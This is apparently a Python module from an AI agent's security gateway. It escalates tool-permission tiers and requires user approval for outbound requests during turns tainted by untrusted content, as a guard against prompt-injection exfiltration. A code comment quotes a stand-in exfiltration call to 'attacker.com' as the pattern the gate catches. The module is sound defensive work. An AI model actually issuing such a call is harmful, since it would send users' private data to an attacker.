"""Tier resolution and taint escalation (DD-111, DD-112, DD-114).

This is the arithmetic of the security model. Two rules do the work:

1. A tainted turn raises any write-or-above tool to T2, so the confused-deputy
   chain cannot complete without the user seeing it.
2. An egress tool in a tainted turn always prompts, whatever its tier — because
   exfiltration disguises itself as retrieval.

T0 reads are deliberately *not* escalated. Prompting on every inbox summary
would produce approval fatigue, and a prompt the user has stopped reading is
worse than no prompt at all (SC-5, threat T-12).
"""

from __future__ import annotations

from collections.abc import Container

from panini.security.types import (
    ApprovalReason,
    EgressEval,
    GateDecision,
    Tier,
    ToolSpec,
)


class DestinationAllowlist:
    """User-managed set of known-good egress destinations (FR-534).

    Membership only softens the *reason* an approval is shown; it never removes
    an approval that taint or tier already requires.
    """

    def __init__(self, destinations: Container[str] | None = None) -> None:
        self._destinations = destinations or frozenset()

    def contains(self, destination: str | None) -> bool:
        if destination is None:
            return True  # nothing outbound to check
        return destination in self._destinations


class PermissionResolver:
    """Decides whether an invocation needs approval, and why."""

    def __init__(self, allowlist: DestinationAllowlist | None = None) -> None:
        self._allowlist = allowlist or DestinationAllowlist()

    def destination_is_known(self, destination: str | None) -> bool:
        """Whether a destination is on the user's allowlist.

        Exposed so the gateway can populate the approval dialog without reaching
        into internals (FR-534).
        """
        return self._allowlist.contains(destination)

    def decide(self, spec: ToolSpec, egress: EgressEval, tainted: bool) -> GateDecision:
        declared = spec.tier
        effective = declared
        reason: ApprovalReason | None = None

        # (1) Taint escalation. T0 is exempt — see module docstring.
        if tainted and declared >= Tier.T1_WRITE:
            effective = max(declared, Tier.T2_EXECUTE)
            reason = ApprovalReason.TAINT_ESCALATED

        approval = effective >= Tier.T1_WRITE
        if approval and reason is None:
            reason = ApprovalReason.TIER

        # (2) Egress while tainted always prompts, regardless of tier.
        #     This is what catches `fetch attacker.com/log?data=…`, which a
        #     tier-only model would wave through as an ordinary read.
        if egress.is_egress and tainted:
            approval = True
            reason = ApprovalReason.EGRESS_TAINTED

        # (3) An unfamiliar destination is worth surfacing even on a clean turn.
        if egress.is_egress and not self._allowlist.contains(egress.destination):
            approval = True
            reason = reason or ApprovalReason.UNKNOWN_DEST

        return GateDecision(
            declared_tier=declared,
            effective_tier=effective,
            approval_required=approval,
            reason=reason,
            is_egress=egress.is_egress,
            destination=egress.destination,
            payload_preview=egress.payload_preview,
        )
